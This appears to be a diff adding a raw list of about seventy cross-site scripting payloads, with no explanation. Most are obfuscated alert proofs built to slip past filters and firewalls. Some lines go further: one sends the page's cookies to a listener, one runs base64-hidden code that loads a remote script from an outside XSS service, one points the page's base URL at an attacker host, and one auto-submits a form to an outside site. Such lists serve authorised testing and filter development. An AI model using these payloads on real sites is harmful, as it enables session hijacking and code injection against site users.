@@ -1,0 +1,73 @@
+javascript://%250Aalert(document.location=document.cookie)
+<svg onload=http://evt.target.ownerDocument.defaultView.alert(1337)>
+xss'''><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'><html onMouseEnter="javascript:parent.javascript:alert(1)"></html>
+<svg onload="alert(1)" <="" svg="">
+<base href="//attacker.com/xss.js/" a="
+x=new class extends Function{}('alert(1)'); x=new x;
+javascript:/*</title></textarea></style --></xmp></script></noembed></noscript></math><svg/onload='//"/**/%0aonmouseover=alert()//'>${{7*2}}
+<svg onload=valueOf().ownerDocument.defaultView.alert(1)>
+<svg onload=alert&#0000000040document.cookie)>
+Reflect.apply(alert, null, [1])
+JavaScript:"\%0A74Svg/On%0ALoad=alert%25%0A26lpar;1%25%0A26rpar;>"
+delete[a=this[atob('YWxlcnQ=')]]/prompt a(1)
+<marquee onstart=alert(1)>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+Data:Text/HTML,<form action=https://brutelogic.com.br/gym.php method=POST><input type=hidden name=p05 value="<Svg/OnLoad=alert(1)>"></form><Script>document.forms[0].submit()</Script>
+>%0D%0A%0D%0A<x '="foo"<x foor='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
+&lt;img longdesc="src='x'onerror=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
+javascript://sub.domain.com/%0Aalert(1)
+';k='e'%0Atop['al'+k+'rt'](1)//
+new MutationObserver(()=>{eval('alert(1)')}).observe(document.body, {childList: true});
+<section onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></section>
+<a '="foo"<a foor='><img src=x onerror=javascript:alert(1)//'>
+<detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//
+'a1l2e3r4t5'.replace(/(.).(.).(.).(.).(.)/g, (match, $1, $2, $3, $4, $5) => { throw{shahmidoe:onerror=this[$1+$2+$3+$4+$5]()}=0, 1337;});
+'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
+<form><button/formaction="%01javascri%09pt:alert`%26grave;">Click me</button>
+1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+%u003Csvg onload=alert(1)>
+<video src=https://broken-sky-3f3f.nowasky-jr.workers.dev onstalled=alert('stalled') onwaiting=alert('waiting') muted autoplay controls></video>
+Array.from`${eval}alert\`1\``
+ondevicemotion=setTimeout;
+Event.prototype.toString=URIError.prototype.toString;
+Event.prototype.message='alert\x281\x29'
+<body onBeforeUnload="javascript:javascript:alert(1)"></body>
+document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(document.cookie) + '>')
+let i = document.createElement('iframe');
+i.srcdoc="<iframe>";
+document.body.append(i);
+setTimeout(x=>i.contentWindow[0].alert(1337),500);
+javascript://www.whitelistddomain.tld?%a0alert%281%29
+'a'.replace(/./,alert)
+eval([,]+'ale'+[,]+[,]+'rt(1)'+[,])
+let x = window.open("//portswigger-labs.net/xss/xss.php?x=';onmessage=alert()//&context=js_string_single", "_blank");
+setInterval(z =>{x.postMessage("x", "*")}, 500)
+<img src=data: onerror:"&Acirc;=alert;&Acirc;(1)">
+">'><details/open/ontoggle=confirm('XSS')>
+[].sort.call`${alert}1337`
+<img onerror="top['loc\u{61}tion'] = 'javascript:alert\u{28})'" src />
+this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))
+<input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== autofocus>
+<body onfocus="javascript:javascript:alert(1)"></body>
+(()=>{})["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164()")()
+<input onfocus="w\u&lcub;69}ndow['\a\l\ert']&DiacriticalGrave;`" autofocus />
+<SvG><set%0Aonbegin%0A=%0aa=confirm;a%28%60xss%60)/x>
+<input id='a'value='global'><input id='b'value='E'><input 'id='c'value='val'><input id='d'value='aler'><input id='e'value='t(documen'><input id='f'value='t.domain)'><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>
+</ <a href="><svg/onload=alert(1)>">
+<!DOCTYPE svg [
+<!ENTITY lol "alert(1)">
+<!ENTITY a "data:,&lol;">
+]>
+<svg width="200" height="100" xmlns="http://www.w3.org/2000/svg>
+<script href="&a;"></script>
+</svg>
+window.name='=alert(1)';
+reportError(name,onerror=eval)
+<body onload="javascript:javascript:alert(1)"></body>
+<object onError="javascript:javascript:alert(1)"></object>
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
+<details/open/ontoggle=reportError(URL)>
+<https:X55.is/onfocus=import(tagName)+AutoFocus+ContentEditable>
+<iframe onbeforeload="javascript:javascript:alert(1)"></iframe>
+<svg><use><set attributeName="href" to="data:image/svg+xml,&lt;svg id='x' xmlns='http://w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
